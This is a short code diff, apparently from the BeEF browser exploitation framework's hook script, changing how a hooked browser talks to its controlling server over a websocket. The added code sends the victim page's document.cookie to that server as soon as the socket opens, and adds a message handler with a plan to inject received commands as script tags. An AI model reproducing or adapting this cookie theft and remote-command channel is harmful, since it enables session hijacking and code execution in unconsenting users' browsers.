@@ -28,7 +28,7 @@ beef.websocket = {
         if (beef.browser.isFF() && ! beef.browser.isFF11) {
             beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
 
-        } else {
+        } else{
             beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
 
         }
@@ -40,8 +40,15 @@ beef.websocket = {
         /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
         this.socket.onopen = function () {
             console.log("Socket has been opened!");
-            beef.websocket.send("helo");
+
+            /*send browser id*/
+            beef.websocket.send(document.cookie);
             console.log("Connected and Helo");
+        }
+        this.socket.onmessage = function (message){
+           //@todo append the command to head in <script> </script>
+            console.log("We recive a message "+message.data);
+
         }
 
     },
